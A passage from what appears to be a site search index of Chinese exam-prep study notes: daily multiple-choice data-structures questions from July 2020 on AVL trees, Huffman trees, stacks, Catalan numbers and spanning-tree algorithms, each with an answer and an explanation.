\u89e3\u6790\uff1a\u5148\u5e8f\u5e8f\u5217\u662f\u5148\u7236\u7ed3\u70b9\uff0c\u63a5\u7740\u5de6\u5b50\u6811\uff0c\u7136\u540e\u53f3\u5b50\u6811\u3002\u4e2d\u5e8f\u5e8f\u5217\u662f\u5148\u5de6\u5b50\u6811\uff0c\u63a5\u7740\u7236\u7ed3\u70b9\uff0c\u7136\u540e\u53f3\u5b50\u6811\uff0c\u9012\u5f52\u8fdb\u884c\u3002\u5982\u679c\u6240\u6709\u975e\u53f6\u7ed3\u70b9\u53ea\u6709\u53f3\u5b50\u6811\uff0c\u5148\u5e8f\u5e8f\u5217\u548c\u4e2d\u5e8f\u5e8f\u5217\u90fd\u662f\u5148\u7236\u7ed3\u70b9\uff0c\u7136\u540e\u53f3\u5b50\u6811\uff0c\u9012\u5f52\u8fdb\u884c\uff0c\u56e0\u6b64B\u6b63\u786e\u3002 2. Week 4 # 2.1. Mon # \u82e5\u5c06\u5173\u952e\u5b571\uff0c2\uff0c3\uff0c4\uff0c5\uff0c6\uff0c7 \u4f9d\u6b21\u63d2\u5165\u5230\u521d\u59cb\u4e3a\u7a7a\u7684\u5e73\u8861\u4e8c\u53c9\u6811T \u4e2d\uff0c\u5219T \u4e2d\u5e73\u8861\u56e0\u5b50\u4e3a0 \u7684\u5206\u652f\u7ed3\u70b9\u7684\u4e2a\u6570\u662f [\u5409\u6797\u5927\u5b66] A. 0 B. 1 C. 2 D. 3 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u6ce8\u610f\uff0c\u95ee\u7684\u662f\u5206\u652f\u7ed3\u70b9\uff0c\u4e0d\u5305\u62ec\u53f6\u5b50\u7ed3\u70b9\u7684\u5e73\u8861\u56e0\u5b50\u3002 2.2. Tue # \u5148\u5e8f\u5e8f\u5217\u4e3aa,b,c,d \u7684\u4e0d\u540c\u4e8c\u53c9\u6811\u7684\u4e2a\u6570\u662f [\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66] A. 13 B. 14 C. 15 D. 16 \u6ce8\uff1a\u5361\u7279\u5170\u6570\u4e3a 1, 1, 2, 5, 14, 42, 132, ... f(n)=\\frac{C_{2 n}^{n}}{n+1} f(n)=\\sum_{i=0}^{n-1} f(i) \\times f(n-i-1) f(n)=C_{2 n}^{n}-C_{2 n}^{n-1} C_{n+1}=C_{0} C_{n}+C_{1} C_{n-1}+\\cdots+C_{n} C_{0} \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u6839\u636e\u4e8c\u53c9\u6811\u524d\u5e8f\u904d\u5386\u548c\u4e2d\u5e8f\u904d\u5386\u7684\u9012\u5f52\u7b97\u6cd5\u4e2d\u9012\u5f52\u5de5\u4f5c\u6808\u7684\u72b6\u6001\u53d8\u5316\u5f97\u51fa\uff1a\u524d\u5e8f\u5e8f\u5217\u548c\u4e2d\u5e8f\u5e8f\u5217\u7684\u5173\u7cfb\u76f8\u5f53\u4e8e\u4ee5\u524d\u5e8f\u5e8f\u5217\u4e3a\u5165\u6808\u6b21\u5e8f\uff0c\u4ee5\u4e2d\u5e8f\u5e8f\u5217\u4e3a\u51fa\u6808\u6b21\u5e8f\u3002\u56e0\u4e3a\u524d\u5e8f\u5e8f\u5217\u548c\u4e2d\u5e8f\u5e8f\u5217\u53ef\u4ee5\u552f\u4e00\u5730\u786e\u5b9a\u4e00\u68f5\u4e8c\u53c9\u6811\uff0c\u6240\u4ee5\u9898\u610f\u76f8\u5f53\u4e8e\u201c\u4ee5\u5e8f\u5217a,b,c,d \u4e3a\u5165\u6808\u6b21\u5e8f\uff0c\u5219\u51fa\u6808\u5e8f\u5217\u7684\u4e2a\u6570\u4e3a\uff1f\u201d\uff0c\u6839\u636e\u5361\u7279\u5170\u6570\uff0c\u5f9714\u79cd\u4e0d\u540c\u7684\u51fa\u6808\u5e8f\u5217\u4e2a\u6570\u3002 2.3. Wed # \u4e00\u4e2a\u9ad8\u5ea6\u4e3ah\u7684\u6ee1\u4e8c\u53c9\u6811\u5171\u6709n\u4e2a\u7ed3\u70b9\uff0c\u5176\u4e2d\u6709m\u4e2a\u53f6\u5b50\u7ed3\u70b9\uff0c\u5219 \u6210\u7acb\u3002 [\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66] A. n=h+m B. h+m=2n C. m=h-1 D. n=2m-1 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u6ee1\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\u548c\u8282\u70b9\u603b\u6570\u6ee1\u8db3\u4e0b\u5217\u5173\u7cfbn = 2^h - 1;\u800c\u4e14\u53f6\u5b50\u8282\u70b9\u5168\u90fd\u4f4d\u4e8e\u7b2cH \u5c42\uff0c\u6240\u4ee5\u53c8\u6709m = 2^(h-1);\u6613\u77e5n = 2*m-1\u3002 2.4. Thu # \u4e00\u4e2a\u7a7a\u6808\uff0c\u5982\u679c\u6709\u987a\u5e8f\u8f93\u5165\uff1aa1\uff0ca2\uff0ca3\u3002\u3002\u3002an\uff08\u4e2a\u6570\u5927\u4e8e3\uff09\uff0c\u800c\u4e14\u8f93\u51fa\u7b2c\u4e00\u4e2a\u4e3aan-1,\u90a3\u4e48\u6240\u6709\u90fd\u51fa\u6808\u540e\uff0c [\u5409\u6797\u5927\u5b66] A. \u8f93\u51fa\u7684\u6700\u540e\u5143\u7d20\u4e00\u5b9a\u4e3aan B. \u8f93\u51fa\u7684\u6700\u540e\u5143\u7d20\u4e00\u5b9a\u4e3aa1 C. \u4e0d\u80fd\u786e\u5b9a\u5143\u7d20a1~an-2\u8f93\u51fa\u987a\u5e8f D. an-2\u4e00\u5b9a\u6bd4an-3\u5148\u51fa \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1aa1~an\u5fc5\u987b\u662f\u6309\u987a\u5e8f\u5165\u6808\u7684\u3002\u9898\u76ee\u6700\u540e\u8bf4\u7b2c\u4e00\u4e2a\u51fa\u6808\u7684\u662fan-1,\u7531\u8fd9\u91cc\u53ef\u4ee5\u63a8\u6d4b\uff0ca1-an-1\u90fd\u662f\u987a\u5e8f\u5165\u6808\u4e86\uff0c\u81f3\u4e8ean\uff0c\u4ed6\u53ef\u4ee5\u5728a1~an-1\u4efb\u610f\u4e00\u4e2a\u5143\u7d20\u51fa\u6808\u7684\u8fc7\u7a0b\u5165\u6808\u7684\uff0c\u6240\u4ee5an\u8f93\u51fa\u7684\u987a\u5e8f\u4e0d\u80fd\u786e\u5b9a\uff0c\u6545A\uff0cB\u90fd\u9519\uff08\u5bf9\u4e8eB\uff0c\u82e5an\u59cb\u7ec8\u4e0d\u8fdb\u6808\uff0ca1~an-2\u90fd\u51fa\u6808\u4e86\u4ee5\u540e\u518d\u8fdb\u6808\uff0c\u8fd9\u65f6\u5019\u5f39\u51fa\u7684\u662fan\u4e3a\u6700\u540e\u4e00\u4e2a\uff09\u3002C\u9009\u9879\u9519\u8bef\uff0ca1~an-2\u8f93\u51fa\u987a\u5e8f\u662f\u9006\u5e8f\u7684\uff0c\u800can\u53ef\u80fd\u7a7f\u63d2\u5728\u8fd9\u4e2a\u5e8f\u5217\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a\u4f4d\u7f6e\u3002\u6240\u4ee5an-2\u4e00\u5b9a\u6bd4an-3\u5148\u51fa\u662f\u6b63\u786e\u7684\uff0c\u9009D\u3002 2.5. Fri # \u4ee5\u4e0b\u8bf4\u6cd5\u9519\u8bef\u7684\u662f [\u5357\u4eac\u5927\u5b66] A. \u4e00\u822c\u5728\u54c8\u592b\u66fc\u6811\u4e2d\uff0c\u6743\u503c\u8d8a\u5927\u7684\u53f6\u5b50\u79bb\u6839\u7ed3\u70b9\u8d8a\u8fd1 B. \u54c8\u592b\u66fc\u6811\u4e2d\u6ca1\u6709\u5ea6\u6570\u4e3a1\u7684\u5206\u652f\u7ed3\u70b9 C. \u82e5\u521d\u59cb\u68ee\u6797\u4e2d\u5171\u6709n\u68f5\u4e8c\u53c9\u6811\uff0c\u6700\u7ec8\u6c42\u5f97\u7684\u54c8\u592b\u66fc\u6811\u5171\u67092n-1\u4e2a\u7ed3\u70b9 D. \u82e5\u521d\u59cb\u68ee\u6797\u4e2d\u5171\u6709n\u68f5\u4e8c\u53c9\u6811\uff0c\u8fdb\u884c2n-1\u6b21\u5408\u5e76\u540e\u624d\u80fd\u5269\u4e0b\u4e00\u68f5\u6700\u7ec8\u7684\u54c8\u592b\u66fc\u6811 \u6ce8\uff1a\u7ed3\u70b9\u5ea6\u6570\u4e3a\u5176\u5b50\u7ed3\u70b9\u7684\u4e2a\u6570 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u6839\u636e\u54c8\u592b\u66fc\u6811\u7684\u6027\u8d28\uff0cA\uff0cB\u663e\u7136\u6b63\u786e\uff0c\u521d\u59cb\u68ee\u6797\u4e2d\u7684n\u68f5\u4e8c\u53c9\u6811\uff0c\u6bcf\u68f5\u6811\u6709\u4e00\u4e2a\u5b64\u7acb\u7684\u7ed3\u70b9\uff0c\u5b83\u4eec\u65e2\u662f\u6839\uff0c\u53c8\u662f\u53f6\u5b50\u3002n\u4e2a\u53f6\u5b50\u7684\u54c8\u592b\u66fc\u6811\u8981\u7ecf\u8fc7n-1\u6b21\u5408\u5e76\uff0c\u4ea7\u751fn-1\u4e2a\u65b0\u7ed3\u70b9\u3002\u6700\u7ec8\u6c42\u5f97\u7684\u54c8\u592b\u66fc\u6811\u67092n-1\u4e2a\u7ed3\u70b9\uff0c\u6240\u4ee5C\u6b63\u786e\u3002\u54c8\u592b\u66fc\u6811\u6bcf\u6b21\u5408\u5e76\u90fd\u4f1a\u5c11\u4e00\u9897\u4e8c\u53c9\u6811\uff0c\u6240\u4ee5\u8fdb\u884cn-1\u6b21\u5408\u5e76\u5373\u53ef\uff0cD\u9519\u8bef\u3002 2.6. Sat # \u6c42\u4e0b\u9762\u5e26\u6743\u56fe\u7684\u6700\u5c0f\uff08\u4ee3\u4ef7\uff09\u751f\u6210\u6811\u65f6\uff0c\u53ef\u80fd\u662f\u514b\u9c81\u65af\u5361\uff08Kruskal\uff09\u7b97\u6cd5\u7b2c2 \u6b21\u9009\u4e2d\u4f46\u4e0d\u662f\u666e\u91cc\u59c6\uff08Prim\uff09\u7b97\u6cd5\uff08\u4eceV4 \u5f00\u59cb\uff09\u7b2c2 \u6b21\u9009\u4e2d\u7684\u8fb9\u662f [\u7535\u5b50\u79d1\u6280\u5927\u5b66] A. (V1,V3) B. (V1,V4) C. (V2,V3) D. (V3,V4) \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1aKruskal\u7b97\u6cd5\u662f\u6309\u6743\u503c\u9009\u8fb9\uff0c\u82e5\u9009\u8fb9\u540e\u4e0d\u5f62\u6210\u56de\u8def,\u5219\u4fdd\u7559\u4f5c\u4e3a\u4e00\u6761\u8fb9,\u82e5\u5f62\u6210\u56de\u8def\u5219\u9664\u53bb \u3002Prim\u7b97\u6cd5\u662f\u6bcf\u6b21\u4ece\u5f53\u524d\u7684\u4e8c\u53c9\u6811\u8282\u70b9\u5411\u5916\u5ef6\u4f38\u7684\uff0c\u9009\u62e9\u6743\u503c\u6700\u5c0f\u7684\u8fb9\u3002 \u514b\u9c81\u65af\u5361\uff08Kruskal\uff09\u7b97\u6cd5\u548c\u666e\u91cc\u59c6\uff08Prim\uff09\u7b97\u6cd5\uff08\u4eceV4 \u5f00\u59cb\uff09\u7b2c1\u6b21\u9009\u4e2d\u7684\u8fb9\u90fd\u662f(v1,v4)\uff0c\u6392\u9664B\u3002Kruskal\u7b97\u6cd5\u7b2c\u4e8c\u6b21\u53ef\u4ee5\u9009\u62e9(v1,v3),(v2,v3), (v3,v4); Prim\u7b97\u6cd5\u7b2c\u4e8c\u6b21\u53ef\u4ee5\u9009\u62e9(v1,v3),(v3,v4)\uff0c\u6545\u53ef\u80fd\u662f\u514b\u9c81\u65af\u5361\uff08Kruskal\uff09\u7b97\u6cd5\u7b2c2 \u6b21\u9009\u4e2d\u4f46\u4e0d\u662f\u666e\u91cc\u59c6\uff08Prim\uff09\u7b97\u6cd5\uff08\u4eceV4 \u5f00\u59cb\uff09\u7b2c2 \u6b21\u9009\u4e2d\u7684\u8fb9\u662f(v2,v3)\u3002 2.7. Sun # \u5df2\u77e5\u4e09\u53c9\u6811T \u4e2d6 \u4e2a\u53f6\u7ed3\u70b9\u7684\u6743\u5206\u522b\u662f2\uff0c3\uff0c4\uff0c5\uff0c6\uff0c7\uff0cT \u7684\u5e26\u6743\uff08\u5916\u90e8\uff09\u8def\u5f84\u957f\u5ea6\u6700\u5c0f\u662f [\u5c71\u4e1c\u5927\u5b66] A. 27 B. 46 C. 54 D. 56 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1am\u8868\u793a\u8282\u70b9\u4e2a\u6570 ,k\u8868\u793aK\u53c9\u6811 \u82e5\uff08m-1\uff09%(k-1) = 0\u8bf4\u660e\u4e0d\u9700\u8981\u865a\u6bb5\uff0c\u5426\u5219\u9700\u8981\uff08K-1\uff09-\uff08m-1\uff09%(k-1)\u4e2a\u865a\u6bb5\u3002 \u672c\u9898m=6,k=3\u3002 \u5219\uff086-1\uff09%\uff083-1\uff09=1\u3002\u9700\u8981\u865a\u6bb52 - 1 = 1\u6dfb\u52a0\u7684\u865a\u6bb5\u53ef\u89c6\u4e3a0\u3002\u7136\u540e\u6309\u7167\u4f18\u5148\u53d6\u6700\u5c0f\u7684\u4e09\u4e2a\u7684\u539f\u5219\uff0c\u6784\u9020\u4e09\u53c9\u6811\u3002 \u7ed3\u679c\u4e3a5+14+27=46\u3002","title":"2020 July"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#2020-july","text":"","title":"\u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 July"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#_1","text":"\u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 July \u76ee\u5f55 1. Week 3 1.1. Wed 1.2. Thu 1.3. Fri 1.4. Sat 1.5. Sun 2. Week 4 2.1. Mon 2.2. Tue 2.3. Wed 2.4. Thu 2.5. Fri 2.6. Sat 2.7. Sun","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#1-week-3","text":"","title":"1. Week 3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#11-wed","text":"\u5bf9\u4e00\u7ec4\u6570\u636e(2\uff0c12\uff0c16\uff0c88\uff0c5\uff0c10)\u8fdb\u884c\u6392\u5e8f\uff0c\u82e5\u524d\u4e09\u8d9f\u6392\u5e8f\u7ed3\u679c\u5982\u4e0b \u7b2c\u4e00\u8d9f\uff1a2\uff0c12\uff0c16\uff0c5\uff0c10\uff0c88 \u7b2c\u4e8c\u8d9f\uff1a2\uff0c12\uff0c5\uff0c10\uff0c16\uff0c88 \u7b2c\u4e09\u8d9f\uff1a2\uff0c5\uff0c10\uff0c12\uff0c16\uff0c88 \u5219\u91c7\u7528\u7684\u6392\u5e8f\u65b9\u6cd5\u53ef\u80fd\u662f [\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66] A\uff0e\u8d77\u6ce1\u6392\u5e8f B\uff0e\u5e0c\u5c14\u6392\u5e8f C\uff0e\u5f52\u5e76\u6392\u5e8f D\uff0e\u57fa\u6570\u6392\u5e8f \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u8003\u67e5\u5404\u6392\u5e8f\u7b97\u6cd5\u7684\u7279\u70b9\uff1b \u7b2c\u4e00\u8d9f\uff1a2\uff0c12\uff0c16\uff0c5\uff0c10\uff0c88\uff0c\u662f88\u5230\u4e86\u5e8f\u5217\u7684\u672b\u5c3e\uff1b \u7b2c\u4e8c\u8d9f\uff1a2\uff0c12\uff0c5\uff0c10\uff0c16\uff0c88\uff0c\u662f16\u5230\u4e86\u5e8f\u5217\u7684\u5012\u6570\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\uff1b \u7b2c\u4e09\u8d9f\uff1a2\uff0c5\uff0c10\uff0c12\uff0c16\uff0c88\uff0c\u662f12\u5230\u4e86\u5e8f\u5217\u7684\u5012\u6570\u7b2c\u4e09\u4e2a\u4f4d\u7f6e\uff1b \u6839\u636e\u8fd9\u4e09\u8d9f\u6392\u5e8f\u65f6\uff0c\u5747\u662f\u5927\u6570\u6392\u5230\u672b\u5c3e\u7684\u7279\u70b9\u53ef\u4ee5\u77e5\u9053\uff0c\u672c\u9898\u76ee\u4e2d\u53ef\u80fd\u91c7\u7528\u4e86\u8d77\u6ce1\u6392\u5e8f\u3002","title":"1.1. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#12-thu","text":"\u8bbe\u4e00\u68f5\u975e\u7a7a\u5b8c\u5168\u4e8c\u53c9\u6811T\u7684\u6240\u6709\u53f6\u7ed3\u70b9\u5747\u4f4d\u4e8e\u540c\u4e00\u5c42\uff0c\u4e14\u6bcf\u4e2a\u975e\u53f6\u7ed3\u70b9\u90fd\u67092\u4e2a\u5b50\u7ed3\u70b9\u3002\u82e5T\u6709k\u4e2a\u53f6\u7ed3\u70b9\uff0c\u5219T\u7684\u7ed3\u70b9\u603b\u6570\u662f [\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66] A.2k-1 B.2k C.k^2 D.2^k-1 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u9996\u5148\uff0c\u4e00\u68f5\u975e\u7a7a\u5b8c\u5168\u4e8c\u53c9\u6811T\u7684\u6240\u6709\u53f6\u7ed3\u70b9\u5747\u4f4d\u4e8e\u540c\u4e00\u5c42\uff0c\u4e14\u6bcf\u4e2a\u975e\u53f6\u7ed3\u70b9\u90fd\u67092\u4e2a\u5b50\u7ed3\u70b9\u5c31\u662f\u6ee1\u4e8c\u53c9\u6811\u3002\u4e8e\u662f\u6211\u4eec\u8bbe\u6811\u9ad8\u4e3ah\uff0c\u6709 k = 2^(h-1)\uff0ch=log2k+1,\u603b\u7ed3\u70b9\u6570\u4e3a2^h-1 = 2^(log2k+1)-1 = 2*2^(log2k)-1 = 2k-1\u3002","title":"1.2. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#13-fri","text":"\u4e0b\u5217\u9009\u9879\u4e2d\uff0c\u4e0d\u80fd\u6784\u6210\u6298\u534a\u67e5\u627e\u4e2d\u5173\u952e\u5b57\u6bd4\u8f83\u5e8f\u5217\u7684\u662f \u3002[\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66] A. 500,200,450,180 B. 500,450,200,180 C. 180,500,200,450 D. 180,200,500,450 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u6298\u534a\u67e5\u627e\u7684\u5224\u5b9a\u6811\u662f\u4e00\u68f5\u4e8c\u53c9\u6392\u5e8f\u6811\uff0c\u56db\u4e2a\u9009\u9879\u4e2d\uff0c\u53ea\u6709A\u9009\u9879\u7684\u5bf9\u5e94\u5224\u5b9a\u6811\u4e0d\u6ee1\u8db3\u4e8c\u53c9\u6392\u5e8f\u6811\u7684\u7279\u70b9\u3002\u5982\u56fe\uff0c180\u4e0d\u6ee1\u8db3\u5c0f\u4e8e200\u3002","title":"1.3. Fri"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#14-sat","text":"\u73b0\u6709\u4e00\u68f5\u65e0\u91cd\u590d\u5173\u952e\u5b57\u7684\u5e73\u8861\u4e8c\u53c9\u6811\uff08AVL \u6811\uff09,\u5bf9\u5176\u8fdb\u884c\u4e2d\u5e8f\u904d\u5386\u53ef\u5f97\u5230\u4e00\u4e2a\u964d\u5e8f\u5e8f\u5217\u3002\u4e0b\u5217\u5173\u4e8e\u8be5\u5e73\u8861\u4e8c\u53c9\u6811\u7684\u53d9\u8ff0\u4e2d\uff0c\u6b63\u786e\u7684\u662f [\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66] A. \u6839\u7ed3\u70b9\u7684\u5ea6\u4e00\u5b9a\u4e3a2 B. \u6811\u4e2d\u6700\u5c0f\u5143\u7d20\u4e00\u5b9a\u662f\u53f6\u7ed3\u70b9 C. \u6700\u540e\u63d2\u5165\u7684\u5143\u7d20\u4e00\u5b9a\u662f\u53f6\u7ed3\u70b9 D. \u6811\u4e2d\u6700\u5927\u5143\u7d20\u4e00\u5b9a\u662f\u65e0\u5de6\u5b50\u6811 \u6ce8\uff1a\u524d\u5e8f\u904d\u5386-\u6839\u5de6\u53f3\uff0c\u4e2d\u5e8f\u904d\u5386-\u5de6\u6839\u53f3\uff0c\u540e\u5e8f\u904d\u5386-\u5de6\u53f3\u6839 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a A. \u53ea\u6709\u4e00\u4e2a\u6839\u8282\u70b9\u4e5f\u53ef\u4ee5\u79f0\u4e4b\u4e3a\u5e73\u8861\u4e8c\u53c9\u6811\uff0c\u6b64\u65f6\u5ea6\u4e0d\u4e3a2 B. \u4e2d\u5e8f\u904d\u5386\uff1aLPR\u3002\u5f53\u6ca1\u6709R\u7684\u65f6\u5019\uff0c\u6700\u5c0f\u5143\u7d20\u662fP\uff0c\u5b83\u4e0d\u662f\u53f6\u5b50\u7ed3\u70b9 C. \u56e0\u4e3a\u8981\u8fdb\u884c\u5e73\u8861\u8c03\u6574\uff0c\u6240\u4ee5\u4e0d\u4e00\u5b9a\u3002LR\u65cb\u8f6c\u548cRL\u65cb\u8f6c\uff0c\u6700\u540e\u63d2\u5165\u7684\u7ed3\u70b9\u90fd\u53ef\u80fd\u6210\u4e3a\u6839\u8282\u70b9 D. \u4e2d\u5e8f\u904d\u5386\uff1aLPR\u3002\u5982\u679c\u6709\u5de6\u5b50\u6811\uff0c\u5219P\u6bd4\u5de6\u5b50\u6811\u66f4\u5c0f\uff0c\u4e0d\u4f1a\u662f\u6700\u5927\u5143\u7d20","title":"1.4. Sat"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#15-sun","text":"\u8981\u4f7f\u4e00\u68f5\u975e\u7a7a\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u5e8f\u5217\u4e0e\u4e2d\u5e8f\u5e8f\u5217\u76f8\u540c\uff0c\u5176\u6240\u6709\u975e\u53f6\u7ed3\u70b9\u987b\u6ee1\u8db3\u7684\u6761\u4ef6\u662f [\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66] A. \u53ea\u6709\u5de6\u5b50\u6811 B. \u53ea\u6709\u53f3\u5b50\u6811 C. \u7ed3\u70b9\u7684\u5ea6\u5747\u4e3a1 D. \u7ed3\u70b9\u7684\u5ea6\u5747\u4e3a2 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u5148\u5e8f\u5e8f\u5217\u662f\u5148\u7236\u7ed3\u70b9\uff0c\u63a5\u7740\u5de6\u5b50\u6811\uff0c\u7136\u540e\u53f3\u5b50\u6811\u3002\u4e2d\u5e8f\u5e8f\u5217\u662f\u5148\u5de6\u5b50\u6811\uff0c\u63a5\u7740\u7236\u7ed3\u70b9\uff0c\u7136\u540e\u53f3\u5b50\u6811\uff0c\u9012\u5f52\u8fdb\u884c\u3002\u5982\u679c\u6240\u6709\u975e\u53f6\u7ed3\u70b9\u53ea\u6709\u53f3\u5b50\u6811\uff0c\u5148\u5e8f\u5e8f\u5217\u548c\u4e2d\u5e8f\u5e8f\u5217\u90fd\u662f\u5148\u7236\u7ed3\u70b9\uff0c\u7136\u540e\u53f3\u5b50\u6811\uff0c\u9012\u5f52\u8fdb\u884c\uff0c\u56e0\u6b64B\u6b63\u786e\u3002","title":"1.5. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#2-week-4","text":"","title":"2. Week 4"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#21-mon","text":"\u82e5\u5c06\u5173\u952e\u5b571\uff0c2\uff0c3\uff0c4\uff0c5\uff0c6\uff0c7 \u4f9d\u6b21\u63d2\u5165\u5230\u521d\u59cb\u4e3a\u7a7a\u7684\u5e73\u8861\u4e8c\u53c9\u6811T \u4e2d\uff0c\u5219T \u4e2d\u5e73\u8861\u56e0\u5b50\u4e3a0 \u7684\u5206\u652f\u7ed3\u70b9\u7684\u4e2a\u6570\u662f [\u5409\u6797\u5927\u5b66] A. 0 B. 1 C. 2 D. 3 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u6ce8\u610f\uff0c\u95ee\u7684\u662f\u5206\u652f\u7ed3\u70b9\uff0c\u4e0d\u5305\u62ec\u53f6\u5b50\u7ed3\u70b9\u7684\u5e73\u8861\u56e0\u5b50\u3002","title":"2.1. Mon"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#22-tue","text":"\u5148\u5e8f\u5e8f\u5217\u4e3aa,b,c,d \u7684\u4e0d\u540c\u4e8c\u53c9\u6811\u7684\u4e2a\u6570\u662f [\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66] A. 13 B. 14 C. 15 D. 16 \u6ce8\uff1a\u5361\u7279\u5170\u6570\u4e3a 1, 1, 2, 5, 14, 42, 132, ... f(n)=\\frac{C_{2 n}^{n}}{n+1} f(n)=\\sum_{i=0}^{n-1} f(i) \\times f(n-i-1) f(n)=C_{2 n}^{n}-C_{2 n}^{n-1} C_{n+1}=C_{0} C_{n}+C_{1} C_{n-1}+\\cdots+C_{n} C_{0} \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u6839\u636e\u4e8c\u53c9\u6811\u524d\u5e8f\u904d\u5386\u548c\u4e2d\u5e8f\u904d\u5386\u7684\u9012\u5f52\u7b97\u6cd5\u4e2d\u9012\u5f52\u5de5\u4f5c\u6808\u7684\u72b6\u6001\u53d8\u5316\u5f97\u51fa\uff1a\u524d\u5e8f\u5e8f\u5217\u548c\u4e2d\u5e8f\u5e8f\u5217\u7684\u5173\u7cfb\u76f8\u5f53\u4e8e\u4ee5\u524d\u5e8f\u5e8f\u5217\u4e3a\u5165\u6808\u6b21\u5e8f\uff0c\u4ee5\u4e2d\u5e8f\u5e8f\u5217\u4e3a\u51fa\u6808\u6b21\u5e8f\u3002\u56e0\u4e3a\u524d\u5e8f\u5e8f\u5217\u548c\u4e2d\u5e8f\u5e8f\u5217\u53ef\u4ee5\u552f\u4e00\u5730\u786e\u5b9a\u4e00\u68f5\u4e8c\u53c9\u6811\uff0c\u6240\u4ee5\u9898\u610f\u76f8\u5f53\u4e8e\u201c\u4ee5\u5e8f\u5217a,b,c,d \u4e3a\u5165\u6808\u6b21\u5e8f\uff0c\u5219\u51fa\u6808\u5e8f\u5217\u7684\u4e2a\u6570\u4e3a\uff1f\u201d\uff0c\u6839\u636e\u5361\u7279\u5170\u6570\uff0c\u5f9714\u79cd\u4e0d\u540c\u7684\u51fa\u6808\u5e8f\u5217\u4e2a\u6570\u3002","title":"2.2. 